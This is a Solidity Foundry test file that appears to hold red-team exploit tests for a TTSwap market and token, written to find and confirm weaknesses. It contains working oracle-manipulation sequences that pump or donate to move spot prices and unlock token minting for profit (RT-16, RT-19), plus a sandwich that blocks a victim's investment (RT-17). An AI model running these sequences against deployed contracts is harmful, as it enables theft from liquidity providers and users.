// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {BaseSetup} from "../BaseSetup.t.sol";
import {MyToken} from "../../src/test/MyToken.sol";
import {S_GoodTmpState, S_ProofKey} from "../../src/interfaces/I_TTSwap_Market.sol";
import {T_GoodKey, T_GoodKeyLibrary} from "../../src/type/T_GoodKey.sol";
import {L_ProofIdLibrary} from "../../src/libraries/L_Proof.sol";
import {L_GoodConfigLibrary} from "../../src/libraries/L_GoodConfig.sol";
import {TTSwapError} from "../../src/libraries/L_Error.sol";
import {s_share} from "../../src/interfaces/I_TTSwap_Token.sol";
import {
    L_TTSwapUINT256Library,
    toTTSwapUINT256
} from "../../src/libraries/L_TTSwapUINT256.sol";

/// @notice Third-wave red team: attacker-first, profit-or-bust.
///         Targets that survive RT-01..14 and the 2026-08-12 retest.
contract RT_ThirdWave is BaseSetup {
    using T_GoodKeyLibrary for T_GoodKey;
    using L_TTSwapUINT256Library for uint256;
    using L_ProofIdLibrary for S_ProofKey;
    using L_GoodConfigLibrary for uint256;

    uint128 internal constant USDT_INIT_QTY = uint128(50_000 * 10 ** 6);
    uint128 internal constant USDT_INIT_VALUE = uint128(50_000 * 10 ** 12);
    uint128 internal constant BTC_INIT_QTY = uint128(1 * 10 ** 8);
    uint128 internal constant BTC_INIT_VALUE = uint128(63_000 * 10 ** 12);

    address internal attacker;
    address internal victim;
    uint256 internal usdtGoodId;
    uint256 internal btcGoodId;

    function setUp() public override {
        BaseSetup.setUp();
        attacker = users[4];
        victim = users[5];
        vm.warp(100);
        usdtGoodId = _init(_usdtKey(), marketcreator, USDT_INIT_VALUE, USDT_INIT_QTY);
        btcGoodId = _init(_btcKey(), users[1], BTC_INIT_VALUE, BTC_INIT_QTY);
    }

    function _usdtKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(usdt), id: 0});
    }

    function _btcKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(btc), id: 0});
    }

    function _ttsKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(tts_token), id: 0});
    }

    function _init(
        T_GoodKey memory key,
        address owner,
        uint128 value,
        uint128 qty
    ) internal returns (uint256 goodId) {
        vm.startPrank(owner);
        deal(key.contractAddress, owner, 100 * uint256(qty), false);
        MyToken(payable(key.contractAddress)).approve(address(market), type(uint256).max);
        market.initGood(key, toTTSwapUINT256(value, qty), defaultdata, owner, defaultdata);
        goodId = key.toId();
        vm.stopPrank();
    }

    function _proofId(address owner, uint256 goodId) internal pure returns (uint256) {
        return S_ProofKey({owner: owner, currentgood: goodId}).toId();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-15 mitigated: empty-pool idle drip is not credited. First value-good
    // invest after 1 day must not mint the daily TTS emission.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT15_idle_drip_captured_by_dust_value_invest() public {
        _markAsValueGood(usdtGoodId);

        uint128 investQty = 2 * 10 ** 6; // 2 USDT
        deal(address(usdt), attacker, investQty, false);

        vm.warp(block.timestamp + 86_401);

        uint256 ttsBefore = tts_token.balanceOf(attacker);

        vm.startPrank(attacker);
        usdt.approve(address(market), type(uint256).max);
        market.investGood(
            _usdtKey(),
            _packInvest(usdtGoodId, investQty),
            defaultdata,
            defaultdata,
            attacker
        );

        uint256 proofId = _proofId(attacker, usdtGoodId);
        uint128 shares = market.getProofState(proofId).shares.amount0();
        market.disinvestProof(proofId, shares, address(0), attacker, defaultdata);
        vm.stopPrank();

        uint256 ttsProfit = tts_token.balanceOf(attacker) - ttsBefore;
        emit log_named_uint("RT15 TTS minted (raw 12d)", ttsProfit);
        assertEq(ttsProfit, 0, "empty-pool idle day must not mint to first staker");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-16: shareMint reads Market.ishigher spot (V/Q). Same-tx pump TTS,
    // mint share, dump. Cross-contract oracle manipulation.
    // Precondition: token-admin granted a share (metric just above spot).
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT16_shareMint_spot_oracle_pump() public {
        _relaxSafeLine(usdtGoodId);

        // TTS: V=1e17, Q=1e16 → price 10. USDT price 1e6. Ratio ≈ 1e-5.
        // metric 8 gate = 2^8 / 2e7 = 1.28e-5. Needs a ~1.3x pump.
        uint128 ttsQty = uint128(10_000 * 10 ** 12);
        uint128 ttsVal = uint128(100_000 * 10 ** 12);
        vm.prank(marketcreator);
        tts_token.mint(marketcreator, ttsQty);
        vm.startPrank(marketcreator);
        tts_token.approve(address(market), type(uint256).max);
        market.initGood(_ttsKey(), toTTSwapUINT256(ttsVal, ttsQty), defaultdata, marketcreator, defaultdata);
        vm.stopPrank();
        uint256 ttsGoodId = _ttsKey().toId();
        _relaxSafeLine(ttsGoodId);

        vm.prank(marketcreator);
        tts_token.setEnv(address(market));

        s_share memory share = s_share({leftamount: 4_000_000 * 10 ** 12, metric: 8, chips: 1});
        vm.prank(marketcreator);
        tts_token.addShare(share, attacker);

        assertEq(tts_token.usershares(attacker).metric, 8, "share parked at metric 8");

        // Control: shareMint reverts at current spot.
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 68));
        tts_token.shareMint();

        uint256 usdtStart = 20_000 * 10 ** 6;
        deal(address(usdt), attacker, usdtStart, false);
        uint256 usdtBefore = usdt.balanceOf(attacker);

        vm.startPrank(attacker);
        usdt.approve(address(market), type(uint256).max);
        // Pump: buy TTS with USDT → Q_tts down, ratio up through the gate.
        market.buyGood(
            _usdtKey(),
            _ttsKey(),
            toTTSwapUINT256(uint128(15_000 * 10 ** 6), 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        uint256 ttsAfterPump = tts_token.balanceOf(attacker);
        tts_token.shareMint();
        uint256 minted = tts_token.balanceOf(attacker) - ttsAfterPump;
        // Dump only the TTS bought in the pump; keep minted share as profit.
        tts_token.approve(address(market), type(uint256).max);
        if (ttsAfterPump > 0) {
            market.buyGood(
                _ttsKey(),
                _usdtKey(),
                toTTSwapUINT256(uint128(ttsAfterPump), 0),
                address(0),
                defaultdata,
                attacker,
                defaultdata,
                0
            );
        }
        vm.stopPrank();

        uint256 usdtAfter = usdt.balanceOf(attacker);
        int256 usdtPnl = int256(usdtAfter) - int256(usdtBefore);
        uint256 ttsLeft = tts_token.balanceOf(attacker);

        emit log_named_uint("RT16 share minted (raw)", minted);
        emit log_named_int("RT16 USDT PnL (raw 6d)", usdtPnl);
        emit log_named_uint("RT16 TTS leftover (profit inventory)", ttsLeft);

        assertGt(minted, 0, "shareMint succeeded after pump");
        assertEq(tts_token.usershares(attacker).leftamount, 0, "full share unlocked");
        assertEq(ttsLeft, minted, "minted TTS kept after dumping the pump inventory");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-17: investGood quotes credited V ±1%. Sandwich that pumps V/Q
    // makes the victim's pre-trade quote miss by >1% → revert 47.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT17_investGood_sandwich_inflates_V() public {
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(btcGoodId);

        uint128 victimInvest = uint128(50 * 10 ** 8); // 50 BTC
        deal(address(btc), victim, victimInvest, false);
        vm.prank(victim);
        btc.approve(address(market), type(uint256).max);

        uint256 attackerUsdt = 10_000 * 10 ** 6;
        deal(address(usdt), attacker, attackerUsdt, false);
        vm.prank(attacker);
        usdt.approve(address(market), type(uint256).max);

        // Victim quotes fair V before the pump (what a honest UI would send).
        uint256 quoted = _packInvest(btcGoodId, victimInvest);

        vm.startPrank(attacker);
        market.buyGood(
            _usdtKey(),
            _btcKey(),
            toTTSwapUINT256(uint128(8_000 * 10 ** 6), 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        vm.stopPrank();

        uint256 usdtBefore = usdt.balanceOf(attacker);

        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 47));
        market.investGood(
            _btcKey(),
            quoted,
            defaultdata,
            defaultdata,
            victim
        );

        uint256 btcHeld = btc.balanceOf(attacker);
        vm.startPrank(attacker);
        btc.approve(address(market), type(uint256).max);
        if (btcHeld > 0) {
            market.buyGood(
                _btcKey(),
                _usdtKey(),
                toTTSwapUINT256(uint128(btcHeld), 0),
                address(0),
                defaultdata,
                attacker,
                defaultdata,
                0
            );
        }
        vm.stopPrank();

        emit log_named_int(
            "RT17 attacker USDT PnL after blocked invest",
            int256(usdt.balanceOf(attacker)) - int256(usdtBefore)
        );
        assertEq(
            market.getProofState(_proofId(victim, btcGoodId)).shares.amount0(),
            0,
            "victim invest blocked"
        );
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-18: default safeLineUpper=100 makes ANY sell-into-pool revert.
    // Product cannot trade until admin sets upper>100, which re-opens RT-02.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT18_default_safeline_bricks_first_swap() public {
        deal(address(usdt), attacker, 1e9, false);
        vm.startPrank(attacker);
        usdt.approve(address(market), type(uint256).max);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 55));
        market.buyGood(
            _usdtKey(),
            _btcKey(),
            toTTSwapUINT256(uint128(1e6), 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        vm.stopPrank();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-19: goodWelfare crashes USDT price (Q up, V fixed) and unlocks
    // shareMint without a swap. Cost = donated USDT. Profit = minted TTS.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT19_welfare_crashes_usdt_oracle_for_shareMint() public {
        uint128 ttsQty = uint128(10_000 * 10 ** 12);
        uint128 ttsVal = uint128(100_000 * 10 ** 12);
        vm.prank(marketcreator);
        tts_token.mint(marketcreator, ttsQty);
        vm.startPrank(marketcreator);
        tts_token.approve(address(market), type(uint256).max);
        market.initGood(_ttsKey(), toTTSwapUINT256(ttsVal, ttsQty), defaultdata, marketcreator, defaultdata);
        tts_token.setEnv(address(market));
        vm.stopPrank();

        s_share memory share = s_share({leftamount: 10_000_000 * 10 ** 12, metric: 8, chips: 1});
        vm.prank(marketcreator);
        tts_token.addShare(share, attacker);

        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 68));
        tts_token.shareMint();

        // Donate USDT to inflate Q_usdt → USDT price down → TTS/USDT ratio up.
        // Need ~1.3x Q_usdt: 0.3 * 5e10 = 1.5e10 = 15_000 USDT. Use 20_000.
        uint128 donate = 20_000 * 10 ** 6;
        deal(address(usdt), attacker, donate, false);
        uint256 ttsBefore = tts_token.balanceOf(attacker);

        vm.startPrank(attacker);
        usdt.approve(address(market), type(uint256).max);
        market.goodWelfare(usdtGoodId, donate, defaultdata, attacker, defaultdata);
        tts_token.shareMint();
        vm.stopPrank();

        uint256 minted = tts_token.balanceOf(attacker) - ttsBefore;
        emit log_named_uint("RT19 USDT donated", donate);
        emit log_named_uint("RT19 TTS minted", minted);
        assertGt(minted, 0, "welfare-crashed USDT unlocked shareMint");
        assertEq(tts_token.usershares(attacker).leftamount, 0, "full share unlocked");
    }
}
